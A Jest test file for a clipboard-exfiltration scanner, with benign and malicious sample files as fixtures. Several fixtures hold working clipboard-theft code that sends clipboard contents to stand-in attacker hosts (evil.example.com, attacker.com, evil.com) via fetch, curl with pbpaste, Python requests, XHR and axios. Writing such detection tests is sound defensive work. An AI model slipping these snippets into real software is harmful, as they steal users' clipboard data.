import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import * as fs from 'fs-extra';
import * as path from 'path';
import { clipboardExfiltrationScanner } from '../scanners/clipboard-exfiltration-scanner';

describe('Clipboard Exfiltration Scanner', () => {
  const testDir = path.join(__dirname, '../../test-data/clipboard-exfiltration-scanner');

  beforeAll(async () => {
    await fs.ensureDir(testDir);
  });

  afterAll(async () => {
    await fs.remove(testDir);
  });

  // Test Case 1: Normal clipboard usage without network send (should NOT flag)
  it('should NOT flag normal clipboard read without network send', async () => {
    const testFile = path.join(testDir, 'normal-clipboard.ts');
    await fs.writeFile(
      testFile,
      `
// Normal clipboard usage for paste functionality
async function handlePaste() {
  const text = await navigator.clipboard.readText();
  document.getElementById('editor').value = text;
  console.log('Pasted:', text);
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('normal-clipboard.ts'));
    
    // Should not detect - no network send
    expect(finding).toBeUndefined();
  });

  // Test Case 2: Normal network request without clipboard read (should NOT flag)
  it('should NOT flag normal network request without clipboard access', async () => {
    const testFile = path.join(testDir, 'normal-fetch.ts');
    await fs.writeFile(
      testFile,
      `
// Normal API call
async function saveUserData(data: any) {
  const response = await fetch('/api/save', {
    method: 'POST',
    body: JSON.stringify(data)
  });
  return response.json();
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('normal-fetch.ts'));
    
    // Should not detect - no clipboard read
    expect(finding).toBeUndefined();
  });

  // Test Case 3: CRITICAL - Direct clipboard exfiltration (read → send immediately)
  it('should detect CRITICAL clipboard exfiltration (direct read-to-send)', async () => {
    const testFile = path.join(testDir, 'exfil-direct.ts');
    await fs.writeFile(
      testFile,
      `
// SUSPICIOUS: Direct clipboard exfiltration
async function stealClipboard() {
  const clipboardData = await navigator.clipboard.readText();
  
  // Send to external server
  await fetch('https://evil.example.com/collect', {
    method: 'POST',
    body: JSON.stringify({ data: clipboardData })
  });
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('exfil-direct.ts'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
    expect(finding?.rule).toBe('clipboard-exfiltration');
    expect(finding?.message).toContain('immediately followed by network send');
    expect(finding?.confidence).toBe('definite');
  });

  // Test Case 4: HIGH - Clipboard read and network send in close proximity
  it('should detect HIGH clipboard exfiltration (close proximity)', async () => {
    const testFile = path.join(testDir, 'exfil-close.ts');
    await fs.writeFile(
      testFile,
      `
// SUSPICIOUS: Clipboard read and network send in same function
async function syncClipboard() {
  const text = await navigator.clipboard.readText();
  
  // Some processing happens here
  const processed = text.trim();
  
  // Additional logging and validation
  console.log('Processing clipboard data');
  if (!processed) return null;
  
  // More processing steps
  const validated = validateInput(processed);
  
  // Log activity to local storage
  localStorage.setItem('last-clipboard', validated);
  
  // Additional transformations
  const transformed = transform(validated);
  
  // Send to analytics server
  const response = await fetch('/api/analytics', {
    method: 'POST',
    body: JSON.stringify({ clipboard: transformed })
  });
  
  return response;
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('exfil-close.ts'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('high');
    expect(finding?.rule).toBe('clipboard-exfiltration');
    expect(finding?.confidence).toBe('likely');
  });

  // Test Case 5: MEDIUM - Both capabilities present in same file
  it('should detect MEDIUM risk when both capabilities exist in same file', async () => {
    const testFile = path.join(testDir, 'both-capabilities.ts');
    await fs.writeFile(
      testFile,
      `
// File with both clipboard and network capabilities

async function readClipboard() {
  const text = await navigator.clipboard.readText();
  return text;
}

function processData(input: string) {
  // Data processing logic
  const cleaned = input.trim();
  const normalized = cleaned.toLowerCase();
  return normalized;
}

function validateFormat(data: string): boolean {
  // Validation logic
  return data.length > 0 && data.length < 1000;
}

class DataHandler {
  private cache: Map<string, any> = new Map();
  
  store(key: string, value: any) {
    this.cache.set(key, value);
  }
  
  retrieve(key: string) {
    return this.cache.get(key);
  }
}

interface ApiResponse {
  success: boolean;
  data?: any;
  error?: string;
}

// ... many lines in between with unrelated functions ...

async function sendData(data: any): Promise<ApiResponse> {
  const response = await fetch('/api/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  return response.json();
}

// ... rest of the file ...
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('both-capabilities.ts'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('medium');
    expect(finding?.rule).toBe('clipboard-exfiltration');
    expect(finding?.confidence).toBe('possible');
  });

  // Test Case 6: CLI-based clipboard exfiltration (pbpaste + curl)
  it('should detect CLI-based clipboard exfiltration', async () => {
    const testFile = path.join(testDir, 'exfil-cli.sh');
    await fs.writeFile(
      testFile,
      `
#!/bin/bash
# SUSPICIOUS: Send clipboard to external server

clipboard_data=$(pbpaste)
curl -X POST https://attacker.com/collect -d "$clipboard_data"
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('exfil-cli.sh'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
    expect(finding?.title).toContain('CLI tool');
  });

  // Test Case 7: Python-based clipboard exfiltration
  it('should detect Python clipboard exfiltration', async () => {
    const testFile = path.join(testDir, 'exfil-python.py');
    await fs.writeFile(
      testFile,
      `
import subprocess
import requests

# Read clipboard using xclip
clipboard = subprocess.check_output(['xclip', '-o', '-selection', 'clipboard'])

# Send to remote server
requests.post('https://evil.com/collect', data={'clip': clipboard})
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('exfil-python.py'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
    expect(finding?.message).toContain('Clipboard read');
    expect(finding?.message).toContain('network send');
  });

  // Test Case 8: XMLHttpRequest-based exfiltration
  it('should detect XMLHttpRequest-based clipboard exfiltration', async () => {
    const testFile = path.join(testDir, 'exfil-xhr.js');
    await fs.writeFile(
      testFile,
      `
async function sendClipboardViaXHR() {
  const text = await navigator.clipboard.readText();
  
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://evil.com/api');
  xhr.send(JSON.stringify({ clipboard: text }));
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('exfil-xhr.js'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
    expect(finding?.rule).toBe('clipboard-exfiltration');
  });

  // Test Case 9: axios-based exfiltration
  it('should detect axios-based clipboard exfiltration', async () => {
    const testFile = path.join(testDir, 'exfil-axios.ts');
    await fs.writeFile(
      testFile,
      `
import axios from 'axios';

async function uploadClipboard() {
  const clipData = await navigator.clipboard.read();
  
  await axios.post('https://attacker.com/upload', {
    clipboard: clipData
  });
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings.find(f => f.file?.includes('exfil-axios.ts'));
    
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
    expect(finding?.title).toContain('Browser API');
  });

  // Test Case 10: Verify recommendations are provided
  it('should provide proper recommendations', async () => {
    const testFile = path.join(testDir, 'recommendation-check.ts');
    await fs.writeFile(
      testFile,
      `
async function test() {
  const text = await navigator.clipboard.readText();
  await fetch('/api', { method: 'POST', body: text });
}
`
    );

    const result = await clipboardExfiltrationScanner.scan(testDir);
    const finding = result.findings[0];
    
    expect(finding?.recommendation).toBeDefined();
    expect(finding?.recommendation).toContain('clipboard read');
    expect(finding?.recommendation).toContain('network send');
    expect(finding?.recommendation).toContain('User consent');
  });

  // Test Case 11: Verify scanner metadata
  it('should have correct scanner metadata', async () => {
    const testFile = path.join(testDir, 'metadata-test.ts');
    await fs.writeFile(testFile, `const x = 1;`);

    const result = await clipboardExfiltrationScanner.scan(testDir);
    
    expect(result.scanner).toBe('Clipboard Exfiltration Scanner');
    expect(result.duration).toBeGreaterThanOrEqual(0);
    expect(result.scannedFiles).toBeGreaterThan(0);
  });
});
